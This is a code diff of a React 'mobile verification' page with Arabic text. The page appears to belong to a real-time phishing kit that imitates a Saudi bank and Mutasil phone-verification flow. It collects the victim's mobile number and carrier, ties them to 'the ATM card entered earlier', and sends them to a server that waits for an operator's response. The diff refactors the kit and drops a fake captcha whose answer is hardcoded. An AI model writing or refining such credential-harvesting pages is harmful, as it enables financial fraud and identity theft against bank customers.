@@ -11,50 +11,37 @@ import { useEffect, useState } from "react";
 import { useForm } from "react-hook-form";
 import PhoneInput from "react-phone-number-input";
 import "react-phone-number-input/style.css";
-import { useLocation, useNavigate } from "react-router-dom";
-import { validatePhoneSAnumber } from "@/utils/helpers";
-import {
-  currentPage,
-  extraInfo,
-  isAdminError,
-  logo,
-  sendDataToServer,
-} from "@/context/signals";
-import telProviders from "../../data/tel-providers.ts";
-import Input from "@/components/Input.tsx";
+import { useNavigate } from "react-router-dom";
+import { isAdminError, logo, mainInfo } from "@/real-time/context/signals.ts";
 import { ArrowUpRight } from "lucide-react";
+import { validatePhoneSAnumber } from "@/lib/helpers.ts";
+import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils.ts";
+import telProviders from "@/data/tel-providers";
 
-function Mobileverfication() {
-  const {
-    register,
-    handleSubmit,
-    formState: { errors },
-  } = useForm({ mode: "all" });
+function Mobileverification() {
+  useEffect(() => {
+    setCurrentPage("mobile-verification");
+  }, []);
+
+  const { handleSubmit } = useForm({ mode: "all" });
   useSignals();
-  const { state } = useLocation();
-  const [phone, setValue] = useState<any>(extraInfo.value.phone);
+  const [phone, setValue] = useState<any>(mainInfo.value.phone);
   const [provider, setProvider] = useState("اختر");
   const navigate = useNavigate();
   const [error, setError] = useState({ phone: false, provider: false });
 
   function sendData() {
-    sendDataToServer(
-      {
-        ["رقم الجوال"]: phone,
-        ["مزود الخدمة"]: logo.value,
+    sendDataToServer({
+      data: {
+        "رقم الجوال": phone,
+        "مزود الخدمة": provider,
       },
-      "mobileverfication",
-      "page8",
-      false,
+      current: "mobile-verification",
+      nextPage: "verify",
+      waitingForAdminResponse: false,
       navigate,
-      "/page8",
-      state
-    );
+    });
   }
-
-  useEffect(() => {
-    currentPage.value = "mobileverfication";
-  }, []);
 
   const handlePhoneChange = (value: string | undefined) => {
     setValue(value);
@@ -77,11 +64,19 @@ function Mobileverfication() {
 
   return (
     <Main>
-      <div className="bg-gray-100 min-h-[calc(100vh-400px)] py-20">
+      <div className="bg-gray-100 min-h-screen py-20">
         <form
           className="flex flex-col gap-2 max-w-lg mx-auto bg-white p-8 rounded-2xl"
           onSubmit={handleSubmit(sendData)}
         >
+          <div className="py-2 px-6 mb-4 rounded-xl bg-main">
+            <img
+              src="/assets/images/logo.svg"
+              alt="logo"
+              className="h-10 mx-auto"
+            />
+          </div>
+
           <img
             src="/assets/images/mutasil.png"
             alt="mobile header image"
@@ -99,8 +94,8 @@ function Mobileverfication() {
               <ArrowUpRight className="cursor-pointer w-12 text-main" />
 
               <h2 className="mb-8 font-bold text-gray-600">
-                من اجل حماية عميلنا. نحن بحاجة الى التحقق من ملكية الهاتف
-                النقال. يرجي كتابة رقم هاتفك النقال وإختيار مشغل الشبكة.
+                توثيق واعتماد رقم الجوال المرتبط بالحساب البنكي لبطاقة الصراف
+                المدخلة مسبقاً
               </h2>
             </div>
           </div>
@@ -132,13 +127,13 @@ function Mobileverfication() {
                 id="phone"
                 onChange={handlePhoneChange}
                 defaultCountry="SA"
+                addInternationalOptional={false}
                 placeholder="اكتب رقم الجوال هنا"
                 className={`px-2 [&_.PhoneInputCountrySelectArrow]:ml-2 w-full outline-none border rounded-lg relative transition-all rtl ${
                   error.phone
                     ? "border-red-500 bg-red-50 [&>input]:bg-red-50"
                     : "border-gray-300 bg-gray-100"
                 } `}
-                disabled
               />
             </div>
 
@@ -169,35 +164,6 @@ function Mobileverfication() {
             </Select>
           </div>
 
-          <div className="flex flex-col gap-2">
-            <p className="text-right">
-              الرجاء إدخال كود التحقق المكتوب داخل الصورة*:
-            </p>
-            <div className="flex gap-4 bg-gray-100 p-1 pe-8">
-              <img
-                src="/assets/images/recapu2.png"
-                alt="recapu"
-                className="w-32"
-              />
-              <Input
-                errors={errors}
-                register={register}
-                id="recap"
-                type="text"
-                isAr
-                placeholder="ادخل كود التحقق هنا"
-                className={`bg-white`}
-                options={{
-                  required: "هذا الحقل ضروري",
-                  pattern: {
-                    value: /^bdBDo$/,
-                    message: "يجب كتابة رمز التحقق كما يظهر فى الصورة.",
-                  },
-                }}
-              />
-            </div>
-          </div>
-
           <button
             disabled={error.phone || provider === "اختر"}
             className="w-fit ms-auto mt-2 lg:text-xl capitalize rounded-3xl font-bold py-1.5 px-10 bg-main hover:brightness-110 text-white transition-colors disabled:cursor-not-allowed disabled:bg-gray-400"
@@ -216,4 +182,4 @@ function Mobileverfication() {
   );
 }
 
-export default Mobileverfication;
+export default Mobileverification;
